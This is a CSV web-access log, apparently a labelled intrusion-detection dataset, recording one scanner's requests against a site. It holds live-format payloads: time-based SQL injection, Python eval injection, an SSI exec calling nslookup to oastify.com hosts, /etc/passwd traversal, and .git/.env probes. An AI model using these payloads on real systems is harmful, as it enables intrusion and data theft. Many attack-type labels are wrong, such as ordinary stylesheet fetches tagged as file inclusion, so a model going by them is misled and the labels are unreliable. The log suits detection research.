timestamp,ip,method,url,status,attack_type,user_agent
2025-05-22 06:11:05,192.168.210.183,GET,/.git/logs/refs/heads/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,192.168.210.183,GET,/.git/logs/refs/remotes/origin/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,192.168.210.183,GET,/.git/objects/info/packs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,192.168.210.183,GET,/.git/packed-refs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,192.168.210.183,GET,/.git/refs/heads,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:05,192.168.210.183,GET,/.git/refs/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,192.168.210.183,GET,/.git/refs/heads/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,192.168.210.183,GET,/.git/objects/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,192.168.210.183,GET,/.git/logs/refs/remotes/origin/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,192.168.210.183,GET,/.git/refs/remotes,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:06,192.168.210.183,GET,/.git/COMMIT_EDITMSG,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,192.168.210.183,GET,/.git/refs/remotes/origin,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,192.168.210.183,GET,/.git/refs/remotes/origin/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,192.168.210.183,GET,/.git/refs/remotes/origin/master,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:07,192.168.210.183,GET,/.git/refs/tags,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:11,192.168.210.183,GET,/.gitlab-ci/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:18,192.168.210.183,POST,/Photo-Gallery'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:11:37,192.168.210.183,GET,/.htaccess,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:40,192.168.210.183,GET,/.htaccess-dev,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,192.168.210.183,GET,/.htaccess-local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,192.168.210.183,GET,/.htaccess.BAK,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,192.168.210.183,GET,/.htaccess-marco,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,192.168.210.183,GET,/.htaccess.bak,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:41,192.168.210.183,GET,/.htaccess.bak1,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,192.168.210.183,GET,/.htaccess.inc,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,192.168.210.183,GET,/.htaccess.old,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,192.168.210.183,GET,/.htaccess.orig,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,192.168.210.183,GET,/.htaccess.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:42,192.168.210.183,GET,/.htaccess.save,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,192.168.210.183,GET,/.htaccess.txt,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,192.168.210.183,GET,/.htaccess_extra,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,192.168.210.183,GET,/.htaccess/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,192.168.210.183,GET,/.htaccess_orig,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:43,192.168.210.183,GET,/.htaccess_sc,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,192.168.210.183,GET,/.htaccessBAK,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,192.168.210.183,GET,/.htaccessOLD2,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,192.168.210.183,GET,/.htaccessOLD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:44,192.168.210.183,GET,/.htaccess~,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:47,192.168.210.183,POST,/Photo-Gallery'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:12:03,192.168.210.183,GET,/.git/config,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.3"
2025-05-22 06:12:09,192.168.210.183,GET,/favicon.ico,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.3"
2025-05-22 06:12:16,192.168.210.183,POST,/Photo-Gallery'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:12:39,192.168.210.183,POST,/Photo-Gallery%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:13:17,192.168.210.183,POST,/Photo-Gallery'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:13:52,192.168.210.183,POST,/Photo-Gallery')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:14:25,192.168.210.183,POST,/Photo-Gallery'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:14:52,192.168.210.183,POST,/Photo-Gallery'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:15:28,192.168.210.183,POST,/Photo-Gallery'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:16:05,192.168.210.183,POST,/Photo-Gallery'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:16:45,192.168.210.183,POST,/Photo-Gallery')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:17:27,192.168.210.183,POST,/Photo-Gallery'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:21:41,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:22:09,192.168.210.183,GET,/public/frontend/template/css/fonts/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:22:43,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'.sleep(20).'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:23:12,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2%7b$%7bsleep(20)%7d%7d?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:27:07,192.168.210.183,POST,/Photo-Gallery'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:27:40,192.168.210.183,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:28:20,192.168.210.183,POST,/Photo-Gallery'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:28:53,192.168.210.183,POST,/Photo-Gallery%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:30:18,192.168.210.183,GET,/.env,200,Sensitive Data Exposure Probe,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);
2025-05-22 06:30:21,192.168.210.183,GET,/.git/config,200,Sensitive Data Exposure Probe,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);
2025-05-22 06:40:41,192.168.210.183,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:41:21,192.168.210.183,GET,/robots.txt,206,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 06:45:40,192.168.210.183,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22gvy%22%20value%3d%22fuxifd0ard%22--%3e%3c!--%23set%20var%3d%22ix0%22%20value%3d%22hwzkhf2ctf%22--%3e%3c!--%23echo%20var%3d%22gvy%22--%3e%3c!--%23echo%20var%3d%22ix0%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%202hk520nxe0ak9df8son0dmvkabg440ssqgh84ysn.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:48:13,192.168.210.183,GET,/public/frontend/template/css/fonts//etc/passwd?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:48:45,192.168.210.183,GET,/public/frontend/template/css/fonts/file%3a///etc/passwd?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:49:15,192.168.210.183,GET,/public/frontend/template/css/fonts/..././..././..././..././..././..././..././..././..././..././etc/passwd?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:54:51,192.168.210.183,GET,/public/frontend/template/css/fonts/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22kw3%22%20value%3d%22jv2mgh1esh%22--%3e%3c!--%23set%20var%3d%22my5%22%20value%3d%22lx4oij3guj%22--%3e%3c!--%23echo%20var%3d%22kw3%22--%3e%3c!--%23echo%20var%3d%22my5%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%206ip934o1f4boahgctso4eqwobfh850tsrgi85ytn.oastify.com%22%20--%3e?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 07:07:08,192.168.210.183,POST,/wp-admin/admin-ajax.php,404,Broken Access Control (Forced Browsing),"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) V"
2025-05-22 07:07:10,192.168.210.183,POST,/wp-admin/admin-ajax.php?action=uploadFontIcon,404,Broken Access Control (Forced Browsing),"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) V"
2025-05-22 07:32:26,192.168.210.183,GET,/.git/config,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Raspbian Chromium/72.0.3626.1"
2025-05-22 07:36:43,192.168.210.183,GET,/public/frontend/template/css/animate.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:44,192.168.210.183,GET,/public/frontend/template/css/bootstrap.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:44,192.168.210.183,GET,/public/frontend/template/css/styles-desktop.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:45,192.168.210.183,GET,/public/frontend/template/parallax-slider/css/parallax-slider.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:45,192.168.210.183,GET,/public/frontend/template/css/style.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:46,192.168.210.183,GET,/public/frontend/template/css/styles-base.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:46,192.168.210.183,GET,/public/frontend/template/css/components.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:46,192.168.210.183,GET,/public/frontend/template/css/shared.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:47,192.168.210.183,GET,/public/frontend/template/css/font-awesome.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:47,192.168.210.183,GET,/public/frontend/template/css/jquery.fancybox.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:48,192.168.210.183,GET,/public/frontend/template/welfare/css/gallery-team.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:48,192.168.210.183,GET,/public/frontend/template/menu/css/smart-megamenu-responsive.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:49,192.168.210.183,GET,/public/frontend/template/menu/css/bootsnav.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:49,192.168.210.183,GET,/public/frontend/template/menu/css/smart-megamenu.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:49,192.168.210.183,GET,/public/frontend/template/css/fullscreen-slider.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:51,192.168.210.183,GET,/public/frontend/template/css/index-youtube-cinemagraph.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:51,192.168.210.183,GET,/public/frontend/template/css/services2.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:51,192.168.210.183,GET,/public/frontend/template/css/portfolio-home-packages.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:51,192.168.210.183,GET,/public/frontend/template/news/css/site.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:52,192.168.210.183,GET,/public/frontend/template/news/css/styles.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:53,192.168.210.183,GET,/public/frontend/template/Notice/css/jquery.mCustomScrollbar.min.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:53,192.168.210.183,GET,/public/frontend/template/Notice/css/ideaboxNews.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:53,192.168.210.183,GET,/public/frontend/template/circular/css/main.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:55,192.168.210.183,GET,/public/frontend/template/css/milumax.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:55,192.168.210.183,GET,/public/frontend/template/js/jquery-2.2.4.min.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:55,192.168.210.183,GET,/public/frontend/template/video_gallery/css/style.css,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:56,192.168.210.183,GET,/public/frontend/template/menu/js/bootsnav.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:56,192.168.210.183,GET,/public/frontend/template/js/bootstrap.min.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:56,192.168.210.183,GET,/public/frontend/template/menu/js/smart-megamenu.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:58,192.168.210.183,GET,/public/frontend/template/js/common.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:58,192.168.210.183,GET,/public/frontend/template/js/owl.carousel.min.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:58,192.168.210.183,GET,/public/frontend/template/js/modernizr.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:59,192.168.210.183,GET,/public/frontend/template/js/components.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:59,192.168.210.183,GET,/public/frontend/template/js/jquery.fancybox.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-22 07:36:59,192.168.210.183,GET,/public/frontend/template/js/wow.min.js,200,Remote File Inclusion (RFI),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
